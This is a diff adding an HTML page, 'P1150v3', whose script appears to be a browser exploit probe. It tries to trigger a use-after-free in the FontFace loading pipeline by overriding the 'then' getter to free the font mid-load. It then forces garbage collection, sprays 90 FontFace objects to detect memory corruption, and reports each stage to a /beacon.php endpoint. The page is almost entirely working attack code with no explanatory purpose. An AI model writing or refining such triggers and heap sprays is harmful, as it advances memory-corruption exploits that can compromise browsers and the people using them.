@@ -1,0 +1,133 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1150v3</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1150v3: WEAKREF + FIXED FONTFACE SPRAY ===');
+B('P1150V3-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+var ffRef=null; // will hold FontFace ref BEFORE uaf
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+// Save WeakRef to ff BEFORE then getter (safe!)
+var hasWR=false;
+try{ffRef=new WeakRef(ff);hasWR=true;}catch(e){B('P1150V3-NOWR',e.message);}
+B('P1150V3-WRTEST','hasWeakRef='+hasWR);
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  B('P1150V3-THEN','fired');
+  // DON'T save wrapper. Just free.
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  return undefined;
+},set:function(){}});
+
+// Drop our strong ref to ff so only WeakRef + font pipeline hold it
+ff=null;
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  B('P1150V3-UAF','hit='+uafHit);
+  if(!uafHit){B('P1150V3-DONE','nohit');return;}
+
+  // === WeakRef check BEFORE GC ===
+  var preGC='no_wr';
+  if(ffRef){
+    try{var d=ffRef.deref();preGC=d?'alive':'collected';}catch(e){preGC='err:'+e.message.substring(0,20);}
+  }
+  B('P1150V3-PRE-GC',preGC);
+
+  // === GC pressure ===
+  for(var g=0;g<3000;g++){var tmp={x:new Array(50)};tmp=null;}
+  for(var g=0;g<2000;g++){var tmp2=new ArrayBuffer(256);tmp2=null;}
+
+  // === WeakRef check AFTER GC ===
+  var postGC='no_wr';
+  if(ffRef){
+    try{var d2=ffRef.deref();postGC=d2?'alive':'collected';}catch(e){postGC='err:'+e.message.substring(0,20);}
+  }
+  B('P1150V3-POST-GC',postGC);
+
+  // === Even more GC: force a full collection cycle ===
+  var bigTrash=[];
+  for(var g=0;g<500;g++)bigTrash.push(new ArrayBuffer(4096));
+  bigTrash=null;
+  for(var g=0;g<1000;g++){var tmp3=String(g).repeat(200);tmp3=null;}
+
+  var finalGC='no_wr';
+  if(ffRef){
+    try{var d3=ffRef.deref();finalGC=d3?'alive':'collected';}catch(e){finalGC='err:'+e.message.substring(0,20);}
+  }
+  B('P1150V3-FINAL-GC',finalGC);
+
+  // If wrapper is still alive, read its properties
+  if(ffRef){
+    try{
+      var alive=ffRef.deref();
+      if(alive){
+        var stat='',fam='';
+        try{stat=alive.status;}catch(e){stat='ERR';}
+        try{fam=alive.family;}catch(e){fam='ERR';}
+        B('P1150V3-WRAPPER','status='+stat+'|family='+fam);
+      }
+    }catch(e){}
+  }
+
+  // === FontFace spray with valid weights ===
+  log('phase','--- FontFace spray (valid weights) ---');
+  var ffSpray=[];
+  var wts=['100','200','300','400','500','600','700','800','900'];
+  for(var k=0;k<90;k++){
+    var name='sp'+r+'x'+k;
+    var wt=wts[k%9];
+    var sty=k%2===0?'normal':'italic';
+    try{
+      var nf=new FontFace(name,'local(Arial)',{style:sty,weight:wt});
+      ffSpray.push({ff:nf,name:name,wt:wt,style:sty});
+    }catch(e){}
+  }
+  B('P1150V3-FFSPRAY','count='+ffSpray.length);
+
+  // Validate
+  var corrupt=0;
+  for(var k=0;k<ffSpray.length;k++){
+    var s=ffSpray[k];
+    var bad=false;
+    try{if(s.ff.family!==s.name)bad=true;}catch(e){bad=true;}
+    try{if(s.ff.weight!==s.wt)bad=true;}catch(e){bad=true;}
+    try{if(s.ff.style!==s.style)bad=true;}catch(e){bad=true;}
+    if(bad){
+      corrupt++;
+      if(corrupt<=3){
+        try{B('P1150V3-CORRUPT-'+corrupt,'idx='+k+'|fam='+s.ff.family+'/'+s.name+
+          '|wt='+s.ff.weight+'/'+s.wt+'|style='+s.ff.style+'/'+s.style);}catch(e){}
+      }
+    }
+  }
+  B('P1150V3-FFRESULT','corrupt='+corrupt+'/'+ffSpray.length);
+
+  // === fonts.check diagnostic ===
+  var chk='';
+  try{chk=document.fonts.check('1em y'+r);}catch(e){chk='err';}
+  B('P1150V3-CHECK','result='+chk);
+
+  // Summary
+  B('P1150V3-SUMMARY','preGC='+preGC+'|postGC='+postGC+'|finalGC='+finalGC+
+    '|corrupt='+corrupt+'|check='+chk);
+  B('P1150V3-DONE','complete');
+},150);
+</script></body></html>
